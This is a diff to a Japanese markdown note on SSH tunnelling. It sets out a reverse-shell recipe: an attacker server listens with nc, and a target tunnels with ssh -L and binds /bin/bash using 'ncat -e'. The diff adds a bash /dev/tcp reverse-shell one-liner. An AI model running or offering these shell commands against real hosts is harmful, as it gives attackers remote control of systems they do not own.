@@ -34,7 +34,8 @@ $ ssh -L <localport>:<forwarded_host>:<forwarded_port> <username>@<dst_host>
       - `nc -l -p 9999` // local onlyでよいので，なにかlinstenする
     - target server
       - `ssh -L 9999:localhost:9999 <attacker_server>` // sshでつないで，target serverの9999とattacker serverの9999をbindする
-      - `ncat -nv localhost 9999 -e /bin/bash` // localの9999とshellプロセスをbindする
+      - `ncat -nv 127.0.0.1 9999 -e /bin/bash` // localの9999とshellプロセスをbindする
+        - `bash -c 'bash -i >& /dev/tcp/localhost/9999 0>&1'` でもよい
 - [GitHub - jnovack/autossh: Heavily customizable AutoSSH Docker container](https://github.com/jnovack/autossh)
 - [SSHポートフォワード（トンネリング）を使って、遠隔地からLAN内のコンピュータにログインする - 2014-09-12 - ククログ](https://www.clear-code.com/blog/2014/9/12.html)
 - [楽しいトンネルの掘り方(オプション: -L, -R, -f, -N -g) — 京大マイコンクラブ (KMC)](https://www.kmc.gr.jp/advent-calendar/ssh/2013/12/09/tunnel2.html)
